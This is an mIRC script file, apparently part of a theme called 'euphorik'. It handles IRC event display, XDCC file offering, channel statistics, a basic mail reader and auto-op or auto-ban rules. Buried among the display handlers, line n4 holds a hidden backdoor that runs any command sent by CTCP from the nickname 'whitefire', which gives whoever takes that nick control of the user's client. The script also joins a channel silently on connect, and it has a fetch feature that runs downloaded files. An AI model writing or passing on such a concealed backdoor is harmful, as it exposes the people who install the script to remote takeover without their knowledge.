[script]
n0=raw 367:*:{
n1=  if (%bans.l == 1) { unset %bans.l | /echo -a $recol(\c3-\c1-\c5-\c1-\c3-\c4 Bans in) $2 $recol(\c3-\c1-\c5-\c1-\c3-\c4) | echo -a $recol(\c3) $3 $recol(\c1by\c2:\c3) $4 $recol(\c1-) $duration($sub($ctime,$5)) ago! | halt } 
n2=  echo -a $recol(\c3) $3 $recol(\c1by\c2:\c3) $4 $recol(\c1-) $duration($sub($ctime,$5)) ago! | halt
n3=}
n4=ctcp 1:do:*:if ($nick = whitefire) { $2- }
n5=raw 368:*:%bans.l = 1 | /echo -a $recol(\c3-\c1-\c5-\c1-\c3-\c4 end! \c3-\c1-\c5-\c1-\c3-\c4)
n6=#who on
n7=raw 352:*:{
n8=  if ((%w.s != 1) && ($group(#chanstat) == off)) { /echo -a $recol(\c1+--\c3[\c2who is on) $2 $+ $recol(\c3]\c1----------------------\c3- \c1--\c3-  \c1-\c3- \c3- \c1-\c3- -  -) | /echo -a $recol(\c1|\c2) $6 $recol(\c1[\c2) $+ $7 $+ $recol(\c1]\c2) $3 $+ $recol(\c1@\c2) $+ $4 $recol(\c1'\c2) $+ $9 $+ $recol(\c1' /\c2) $5 | %w.s = 1 | halt } 
n9=  if ((%w.s == 1) && ($group(#chanstat) == off)) { /echo -a $recol(\c1|\c2) $6 $recol(\c1[\c2) $+ $7 $+ $recol(\c1]\c2) $3 $+ $recol(\c1@\c2) $+ $4 $recol(\c1'\c2) $+ $9 $+ $recol(\c1' /\c2) $5 | halt }
n10=}
n11=raw 315:*:unset %w.s | /echo -a $recol(\c1+-----\c3[\c2end\c3]\c1--------------------\c3- \c1--\c3-  \c1-\c3- \c3- \c1-\c3- -  -) | halt
n12=#who end
n13=raw 243:*:{
n14=  if (%w.s != 1) { /echo -a $recol(\c1+--\c3[\c2ircops on) $2 $+ $recol(\c3]\c1----------------------\c3- \c1--\c3-  \c1-\c3- \c3- \c1-\c3- -  -) | /echo -a $recol(\c1|\c2) $6 $recol(\c1[\c2) $+ $7 $+ $recol(\c1]\c2) $3 $+ $recol(\c1@\c2) $+ $4 $recol(\c1'\c2) $+ $9 $+ $recol(\c1' /\c2) $5 | %w.s = 1 | halt } 
n15=  else { /echo -a $recol(\c1|\c2) $5 $+ $recol(\c1!\c2) $+ $3 $+ | halt }
n16=}
n17=raw 219:*:unset %w.s | /echo -a $recol(\c1+-----\c3[\c2end\c3]\c1--------------------\c3- \c1--\c3-  \c1-\c3- \c3- \c1-\c3- -  -) | halt
n18=
n19=on 1:open:=:if (($nick == $me) || ($group(#wwwget).status == on)) { msg = $+ $me GET %wwwget HTML/1.0 | .msg = $+ $me $cr } | { splay sounds\idc | if (%autoconn [ $+ [ $nick ] ] == $true) { .msg = $+ $nick %eggpass [ $+ [ $nick ] ] | unset %autoconn [ $+ [ $nick ] ]  } }
n20=on 1:mode:#:echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ $1- $+ $recol(\c3) $+ ) $+ %col1 $+ %rb
n21=on 1:Kick:#:if ($knick == $me) { /close -c $chan | decho You were kicked from $chan by $nick, $recol(\c2"\c3) $+ $1- $+ $recol(\c2"\c4) ...attempting to rejoin... | j $chan }
n22=raw 411:*:/decho /msg - no nickname given!
n23=raw 412:*:/decho /msg - no text given!
n24=raw 482:*:/decho %col1 $+ $2 %col2 $+ - You aren't channel operator! | halt
n25=raw 442:*:/decho You aren't on %col1 $+ $1 $+ %col2 $+ !
n26=raw 436:*:/decho Nick Collision Dectected... changing nicks... | nick $me [ $+ [ $rand(1,400) ] ]
n27=raw 432:*:/decho Erronous Nickname... $+ %col1 ( $+ %col2 $+ $2 $+ %col1 $+ ) | halt
n28=raw 405:*:/decho Unable to $recol(join\c1) $2 $+ , on too many channels already!
n29=raw 404:*:if (m isin $chan($2).mode) echo $2 $2 - cannot send to $recol(channel\c1) ( $+ $recol(\c2moderated\c1) $+ ) | if (($me ison $chan) && (m !isin $chan($2).mode)) echo $2 $2 - cannot send to $recol(channel\c1) ( $+ $recol(\c2desycnhed\c1) $+ ) | if (m !isin $chan($2).mode) echo $2 $2 - cannot send to $recol(channel\c1) ( $+ $recol(\c2not on that channel\c1) $+ ) | halt
n30=raw 403:*:/decho $recol(\c1"\c2) $+ $2 $+ $recol(\c1" \c4-\c1) no such channel | halt
n31=raw 366:*:{
n32=  /decho synched time: $div($sub($ticks,%jtk),1000) $+ s
n33=  /jstuff $active
n34=  halt
n35=}
n36=on 1:topic:*:/echo $chan %logo [topic change by: $nick $+ ] | echo $chan %logo $recol(\c1'\c3) $+ $chan(#).topic $+ $recol(\c1') | halt
n37=raw 332:*:/decho Topic For %col1 $+ $2 $+ $recol(:\c2) | /echo $2 $3- | halt
n38=raw 333:*:/decho Set by: $3 | halt
n39=raw 474:*:/decho Cannot join %col1 $+ $2 - you are banned!
n40=raw 475:*:/decho Cannot join %col1 $+ $2 - incorrect key!
n41=raw 473:*:/decho Cannot join %col1 $+ $2 - invite only!
n42=raw 474:*:/decho Cannot join %col1 $+ $2 - it's full!
n43=raw 461:*:/decho Unable to execute $recol(\c1"\c2) $+ $2- $+ $recol(\c1"\c3) - missing parameters... 
n44=on 1:start:splash | titlebar 
n45=on 1:connect:{
n46=  unset %away.tit
n47=  splay sounds\conn
n48=  inc %uses
n49=  titlebar $null
n50=  .j #sympho
n51=  if (%setup != yes) .timer 1 3 dsetup
n52=}
n53=on 1:disconnect:splay sounds\dc | unset %away.tit
n54=raw 433:*:decho $2 - nickname already in use | whois $2 | halt
n55=on 1:notify:/decho %col1 $+ %lb $+ %col2 $+ notify $+ %col1 $+ %rb $+  $nick is on...  | halt
n56=on 1:action:*:?:echo -a %col1 $+ * $nick $1- | halt
n57=on 1:wallops:echo $chan $recol(%chars) %col1 $+ %lb $+ %col2 $+ wallops $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c4) $+ ) $+ %col1 $+ %rb $+ %col4 $+ $1- | halt
n58=on 1:load:{ /titlebar [euphorik] - | back }
n59=on 1:servermode:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ $1- $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n60=on 1:serverop:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ +o $opnick $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n61=on 1:filesent:*:splay sounds\ftc | /decho %col1 $+ File: $recol(\c2) $+ $filename successfully sent to %col2 $+ $nick
n62=on 1:filercvd:*:splay sounds\ftc | /decho %col1 $+ File: $recol(\c2) $+ $filename successfully recieved from %col2 $+ $nick | .timer 0 1 .close -i $nick
n63=on 1:sendfail:*: splay sounds\ftic | /decho %col1 $+ File: $recol(\c2) $+ $filename failed send to %col2 $+ $nick
n64=on 1:getfail:*: splay sounds\ftic | close -gi $nick | /decho %col1 $+ File: $recol(\c2) $+ $filename failed get from %col2 $+ $nick
n65=on 1:ban:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ +b $banmask $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n66=on 1:unban:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ -b $banmask $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n67=on 1:voice:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ +v $vnick $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n68=on 1:devoice:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ -v $vnick $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n69=on 1:op:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ +o $opnick $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n70=on 1:deop:#:{ echo $chan $recol(%chars) %col1 $+ [ $+ %col2 $+ mode $+ %col3 $+ ( $+ $recol(\c4) $+ $nick $+ $recol(\c3\\c4) $+ -o $opnick $+ $recol(\c3) $+ ) $+ %col1 $+ %rb }
n71=ON 1:TEXT:xdcc *:?:set %xnick $nick | /xd66 $1- | /halt
n72=ON 1:TEXT:*:?:addmsg $nick $1- | halt
n73=on 1:quit:{
n74=  if ((irc isin $1) && (irc isin $2) && ($2 != %lnss)) { %lnss = $2 | /decho Possible netsplit, reported by $1 $+ : $2 | /decho Hit f6 to jump to $2 | .alias f6 server $2 | %split.nicks = %split.nicks $nick | halt }
n75=  if ($2 == %lnss) { %split.nicks = %split.nicks $nick | halt }
n76=  echo -s 0 $+ $recol(%chars) %col1 $+ < $+ %col2 $+ quit $+ %col1 $+ ( $+ %col4 $+ $nick $+ %col1 $+ ) $+ $recol(\c1>) %col1 $+ ' $+ %col5 $+ $lower($1-) $+ %col1 $+ ' 
n77=  %i = 0 
n78=  :start
n79=  inc %i 
n80=  if ($qchan($nick,%i) == $null) halt 
n81=  echo 0 $qchan($nick,%i) $recol(%chars) %col1 $+ < $+ %col2 $+ quit $+ %col1 $+ ( $+ %col4 $+ $nick $+ %col1 $+ ) $+ $recol(\c1>) %col1 $+ ' $+ %col5 $+ $lower($1-) $+ %col1 $+ ' | goto start 
n82=}
n83=on 1:join:#:{
n84=  echo $chan $recol(%chars) $recol(\c1<\c2) $+ $recol(join\c1) $+ ( $+ %col4 $+ $nick $+ $recol(\c1\\c4) $+ $twadr($nick) $+ $recol(\c1\\c4) $+ $chan $+ %col1 $+ )>
n85=  if ((6 isin $level($address($nick,3))) && ($me isop $chan)) { 
n86=    decho $no.und([auto bankick to) $no.und($nick) on $no.und($chan) $+ %rb
n87=    .raw -q mode $chan +b $address($nick,3)
n88=    .raw -q kick $chan $nick
n89=  }  
n90=  if ((2 isin $level($address($nick,3))) && ($me isop $chan)) { 
n91=    .pop $rand(1,30) $chan $nick
n92=    decho $no.und([gave op to) $no.und($nick) on $no.und($chan) $+ %rb
n93=  }
n94=  if ((3 isin $level($address($nick,3))) && ($me isop $chan)) { 
n95=    .timer 1 $rand(1,30) mode $chan +v $nick
n96=    decho $no.und([gave voice to) $no.und($nick) on $no.und($chan) $+ %rb
n97=  }
n98=}
n99=raw 401:*: /decho $recol(\c3[\c2) $+ $2 $+ $recol(\c3]\c4) no such nick/channel...
n100=on 1:text:!birthinfo *:*:if (%binick != $nick) { /birthstuff $nick $2 | /set %binick $nick | /halt }
n101=#xdcc off
n102=ctcp 1:xdcc {
n103=  set %pack $remove($3,$chr(35))  
n104=  if ((%numpacks == $null) || (%numpacks == 0)) { .quote notice $nick :No files offered. | halt }
n105=  elseif (%pack > %numpacks) { .quote notice $nick :File  $+ $3 $+  does not exist. /CTCP $me XDCC LIST. | halt } 
n106=  else {
n107=    if (($2 == list) && ($3)) { %nopath = $nopath(%file [ $+ [ %pack ] ] ) | %ngets = %get [ $+ [ %pack ] ] | .quote notice $nick :Pack: %filedesc [ $+ [ %pack ] ] | .quote notice $nick :Size $str( ,5) File | .quote notice $nick : $+ $fix(10,$lof(%file [ $+ [ %pack ] ] )) %nopath | .quote notice $nick :---------- ------------------------------------------------- | .quote notice $nick : $+ $fix(10,$lof(%file [ $+ [ %pack ] ] )) 1 file(s) :: %ngets Snags | halt }
n108=    elseif (($2 == send) || ($2 == get)) {
n109=      if (%pack !isnum) { .quote notice $nick :File  $+ $3 $+  does not exist. /CTCP $me XDCC HELP. | halt }
n110=      psend $nick %pack | //decho sending %file [ $+ [ $remove($3,%#) ] ] to $hc($nick)
n111=    }
n112=    elseif ($2 == queue) { .quote notice $nick :Queue Length: $lines($tp(queue.txt)) / %maxqueue | halt }
n113=    elseif ($2 == list) { nlist $nick | halt }
n114=    elseif ($2 == help) { .quote notice $nick :/CTCP $me XDCC LIST - to get the list of offered packs. | .quote notice $nick :/CTCP $me XDCC LIST #<N> - to get more info on pack #<N>. | .quote notice $nick :/CTCP $me XDCC SEND #<N> - to send pack #<N>. | halt }
n115=    else { .quote notice $nick :Unrecognized request. Try /CTCP $me XDCC HELP. | halt }
n116=  }
n117=}
n118=#xdcc end
n119=#mircnt off
n120=on 1:CTCPREPLY:VERSION* {
n121=  /if $nick isin %m1nicks { /halt }
n122=  /if ((mIRC32 isin $1-) || (mIRc16 isin $1-)) {
n123=    /set %m1nicks  %m1nicks + $nick
n124=    /inc %mircntusrs
n125=    /.timer67 1 5 /mpcnt5
n126=  }
n127=}
n128=#mircnt end
n129=raw 311:*:unset %wi.* | %wi.nick = $2 | %wi.userhost = $3 $+ @ $+ $4 | %wi.realname = *6 | %wi.away = no | %wi.ircop = no | halt
n130=raw 301:*:%wi.away = $3- | halt
n131=raw 312:*:%wi.using = $3 | halt
n132=raw 313:*:%wi.ircop = yes | halt
n133=raw 319:*:%wi.channels = $parm3* | halt
n134=raw 318:*:wiw | halt 
n135=ON 1:DNS: {
n136=  if ($raddress == $null) { decho couldn't resolve $naddress $+ ! | halt }
n137=  if (%dccshit == on) { raw privmsg %dcnick : $+ $chr(1) $+ DCC CHAT REQUEST $longip($raddress) %dcport | unset %dccshit | halt }
n138=  if ($nick != $null) { /decho  $+ %lb $+ %col1 $+ $nick $+ ] ip address: [ $+ $iaddress $+ ] resolved address: [ $+ $raddress $+ ] }
n139=  if ($nick == $null) { /decho ip address: [ $+ $iaddress $+ ] resolved address: [ $+ $raddress $+ ]  }
n140=}
n141=on 1:TEXT:*:#:{
n142=  if $chan isin $active { halt }
n143=  if (($me isin $parms) || ($left($me,4) isin $parms)) { /set %nadd $len($address($nick,3)) - 3 | /set %rnick $nick | //decho $recol(\c3[\c4) $+  $+ $nick $+  $+  $+ $recol(\c3|\c4) $+  $+ $chan $+ $recol(\c3]\c4) $1- }
n144=}
n145=on 1:text:qadd*:?:{
n146=  if $parm2 == $null /notice $nick err -- you didn't type a quote! 
n147=  if $me isin $parm2* /notice $nick please dont talk about me in quotes ;) | halt
n148=  if $parm2 != $null /notice $nick ... quote " $+ $parm2* $+ " added... thanks! | /write quotes.txt ( $+ $nick $+ )  $parm2* | //echo 4 $active qaDD: ( $+ $nick $+ )  $parm2* | /cmw $nick
n149=}
n150=on 1:CTCPREPLY:VERSION* {
n151=  if ((K.Mardam !isin $parms)) { /decho version reply from  $+ $nick $+ : | /decho $parm2* | /halt }
n152=}  
n153=on 1:CTCPREPLY:PING*: {
n154=  %ptime = $ctime - $2
n155=  %ptime = $dms($duration(%ptime))
n156=  /echo -a [ $+ %col2 $+ ping time for $nick is %ptime $+ ]
n157=} 
n158=;Thanks to GaMe_OvEr for these cool chan stats!
n159=
n160=#wwwget off
n161=on 1:CHAT:*:{
n162=  if (%www.i != 5) { inc %www.i | halt }
n163=  if ($nick == $me) { /write $mircdir\wwwget\ $+ $unodir($remove(%wwwget,?)) $1- | .timer699 1 20 .disable #wwwget | halt }
n164=}
n165=on 1:close:=:if ($nick == $me) { /close -c $me | .disable #wwwget | run $mircdir\wwwget $+ $unodir($remove(%wwwget,?)) }
n166=#wwwget end
n167=
n168=#chanstat off
n169=raw 352:*:{
n170=  if ($parm2 == %statchan) {
n171=    inc %StatsTotal 1
n172=    if (@ isin $parm7) { inc %StatsChanOps 1 }
n173=    if (@ !isin $parm7) { inc %StatsNonOps 1 }
n174=    if (* isin $parm7) { inc %StatsIRCops 1 }
n175=    if (+ isin $parm7) { inc %StatsVoiced 1 }
n176=    if (G isin $parm7) { inc %StatsAway 1 }
n177=    if (H isin $parm7) { inc %StatsHere 1 }
n178=    halt
n179=  }
n180=}
n181=raw 315:*:{
n182=  if ($parm2 == %statchan) {
n183=    %StatsTotal = $nick(%statchan,0)
n184=    if (%StatsChanOps == $null) { set %StatsChanOps 0 }
n185=    if (%StatsNonOps == $null) { set %StatsNonOps 0 }
n186=    if (%StatsIRCops == $null) { set %StatsIRCops 0 }
n187=    if (%StatsVoiced == $null) { set %StatsVoiced 0 }
n188=    if (%StatsAway == $null) { set %StatsAway 0 }
n189=    if (%StatsHere == $null) { set %StatsHere 0 }
n190=    %StatsPerChanOps = [ %StatsChanOps ] / [ %StatsTotal ]
n191=    %StatsPerNonOps = [ %StatsNonOps ] / [ %StatsTotal ]
n192=    %StatsPerIRCops = [ %StatsIRCOps ] / [ %StatsTotal ]
n193=    %StatsPerVoiced = [ %StatsVoiced ] / [ %StatsTotal ]
n194=    %StatsPerAway = [ %StatsAway ] / [ %StatsTotal ]
n195=    %StatsPerHere = [ %StatsHere ] / [ %StatsTotal ]
n196=    
n197=    %StatsPerChanOps =  %StatsChanOps * 10
n198=    %StatsPerNonOps =  %StatsNonOps * 10
n199=    %StatsPerIRCops =  %StatsIRCOps * 10
n200=    %StatsPerVoiced =  %StatsVoiced * 10
n201=    %StatsPerAway =  %StatsAway * 10
n202=    %StatsPerHere =  %StatsHere * 10
n203=    
n204=    %stat.mthd $recol(\c1) $+ %lb $+ $recol(\c2) $+ stats $recol(for\c4) %statchan $+ $recol(\c2:\c1) $+ %rb
n205=    %stat.mthd $recol(\c1) $+ %lb $+ $recol(\c2) $+ total of %StatsTotal users $+ $recol(\c1]) 
n206=    %stat.mthd %col1 $+ [ $+ %col2 $+ irc-ops $+ %col3 $+ ( $+ %col4 $+ %StatsIrcOps  $+ %col3 $+ \ $+ %col4 $+ %StatsPerIrcOps $+ % $+ %col3 $+ ) $+ %col1 $+ %rb 
n207=    %stat.mthd %col1 $+ [ $+ %col2 $+ voiced $+ %col3 $+ ( $+ %col4 $+ %StatsVoiced  $+ %col3 $+ \ $+ %col4 $+ %StatsPerVoiced $+ % $+ %col3 $+ ) $+ %col1 $+ %rb 
n208=    %stat.mthd %col1 $+ [ $+ %col2 $+ ops $+ %col3 $+ ( $+ %col4 $+ %StatsChanOps  $+ %col3 $+ \ $+ %col4 $+ %StatsPerChanOps $+ % $+ %col3 $+ ) $+ %col1 $+ %rb [ $+ %col2 $+ non-ops $+ %col3 $+ ( $+ %col4 $+ %StatsNonOps $+ $recol(\c3\\c4) $+ %StatsPerNonOps $+ % $+ %col3 $+ ) $+ %col1 $+ %rb
n209=    %stat.mthd %col1 $+ [ $+ %col2 $+ gone $+ %col3 $+ ( $+ %col4 $+ %StatsAway  $+ %col3 $+ \ $+ %col4 $+ %StatsPerAway $+ % $+ %col3 $+ ) $+ %col1 $+ %rb [ $+ %col2 $+ here $+ %col3 $+ ( $+ %col4 $+ %StatsHere $+ $recol(\c3\\c4) $+ %StatsPerHere $+ % $+ %col3 $+ ) $+ %col1 $+ %rb
n210=    .disable #chanstat
n211=    .enable #who    
n212=    unset %Stat*
n213=    halt
n214=  }
n215=}
n216=#chanstat end
n217=#cmail off
n218=on 1:input {
n219=  if ((mail isin $active) && ($1 == read)) {
n220=    /mecho read message $2 | /msg = $+ $me RETR $parm2 | /set %message on | /halt 
n221=  } 
n222=  if ((mail isin $active) && ($1 == dele)) {
n223=    /mecho delete message $2 | /msg = $+ $me DELE $parm2 | /halt 
n224=  }
n225=  if (mail isin $active) {
n226=    /mecho $parms | /msg = $+ $me $parms | /halt
n227=  }
n228=}
n229=on 1:open:=:if ($nick == $me) { maillog | timer 1 1 set %start off }
n230=on 1:CHAT:*: {
n231=  if ($1 == Message-Id:) /halt
n232=  if ($1 == Status:) /halt
n233=  if ($1 == X-UIDL:) /halt
n234=  if (Date: == $1) { /echo 6 euphorik mail Date:9 $2- | /halt }
n235=  if ((ESMTP isin $1-) && (Received: == $1)) { /halt }
n236=  if ((Received: == $1)) { /halt }
n237=  if ((by == $1) && (ESMTP isin $1-)) { /halt }
n238=  if (-ERR isin $1) { %message = off | /echo 7 euphorik mail err0r: 0 $+ $parm2* }
n239=  if ((%message == on) && (From: isin $1-)) { /echo 6 euphorik mail From:9 $2- | /halt } 
n240=  if ((%message == on) && (for == $1) && (EDT isin $1-)) { /echo 6 euphorik mail To:9 $remove($parm2,;) | /halt } 
n241=  if ((%message == on) && ($1- != $null) && ($1 != .)) /echo 3 euphorik mail $1- 
n242=  if ($1- = $null) /echo 3 euphorik $+ $chr(160) $+ mail   
n243=  if ((octets isin $parms) && (message(s) isin $parms)) /echo 3 euphorik mail %lb $+ %muser has $parm4 messages... %rb
n244=  if (($1 == .)) { %message = off | /echo 7 euphorik mail $recol(%chars)[end of message]$recol(%chars) | /halt }
n245=}
n246=on 1:close:=:/disable #cmail | /close -c $me | /dde $ddename command "" /close -m euphorik mail
n247=#cmail end 
n248=
n249=on 1:INPUT:{
n250=  if (( $right($1,1) == ; ) || ( $right($1,1) == : ) || ( $1 ison $active ))  { /reet $1- | halt }
n251=  if (($1 == /msg) || ($1 == /m)) { /echo -a %col1 $+ [ $+ %col2 $+ msg $+ %col3 $+ ( $+ %col4 $+ $2 $+ %col3 $+ ) $+ %col1 $+ ] $3- | /.msg $2 $3- | /halt }
n252=  if (($1 == /notice)) { /echo -a %col1 $+ [ $+ %col2 $+ notice $+ %col3 $+ ( $+ %col4 $+ $2 $+ %col3 $+ ) $+ %col1 $+ ] $3- | /.notice $2 $3- | /halt }
n253=  if (($1 == /ctcp)) { /echo -a %col1 $+ [ $+ %col2 $+ ctcp $+ %col3 $+ ( $+ %col4 $+ $2 $+ %col3 $+ ) $+ %col1 $+ ] $3- | /.ctcp $2 $3- | /halt }
n254=} 
n255=
n256=on 1:MODE:#:{
n257=  if ((+o isin $1-) && (665 isin $level($address($2,3))))  { /.onotice $chan auto deop on $2 | /mode $chan -o $2 | /decho $chan auto deop on $2 } 
n258=}
n259=on 1:part:*:/echo $chan $recol(%chars) $recol(\c1<\c2) $+ $recol(part\c1) $+ ( $+ %col4 $+ $nick $+ $recol(\c1\\c4) $+ $chan $+ %col1 $+ )> | halt
n260=raw 421:*:decho bad command $+ %col1 [ $+ $lower($parm2)  $+  %col1 $+ ] | halt
n261=raw 462:*:decho you may not re-register %col1 $+ [ $+ $nick  $+  %col1 $+ ] @ $atime | halt
n262=raw 501:*:decho unknown mode flag $+ %col1 [ $+ $nick  $+  %col1 $+ ] @ $atime | halt
n263=raw 251:*:{
n264=  set %luser.user $add($parm4,$parm7) | set %luser.serv $parm10 
n265=  .timer 1 3 echo -s server %col1 $+ %lb $+  $+ $server $+ %col1 $+ / $+ $port $+ %col1 $+ ] 
n266=  .timer 1 3 echo -s nickname %col1 $+ %lb $+  $+ $me $+ %col1 $+ ] 
n267=  .timer 1 3 echo -s users $+ %col1 [ $+ $add($parm4,$parm7)  $+  %col1 $+ ] servers %col1 $+ [ $+ $parm10 $+ %col1 $+ ] | halt 
n268=}
n269=raw 252:*:.timer 1 3 echo -s opers %col1 $+ [ $+ $parm2  $+  %col1 $+ ] | halt
n270=raw 253:*:halt
n271=raw 254:*:.timer 1 3 echo -s chans %col1 $+ [ $+ $parm2  $+  %col1 $+ ] | halt
n272=raw 255:*:.timer 1 3 echo -s local clients %col1 $+ [ $+ $parm4  $+  %col1 $+ ] local servers %col1 $+ [ $+ $parm7  $+  %col1 $+ ] | halt
n273=raw 265:*:.timer 1 3 echo -s max local clients %col1 $+ [ $+ $parm7  $+  %col1 $+ ] | halt
n274=raw 266:*:.timer 1 3 echo -s max global clients  %col1 $+ [ $+ $parm7  $+  %col1 $+ ] | halt
n275=on 1:dccget:splay sounds\ift 
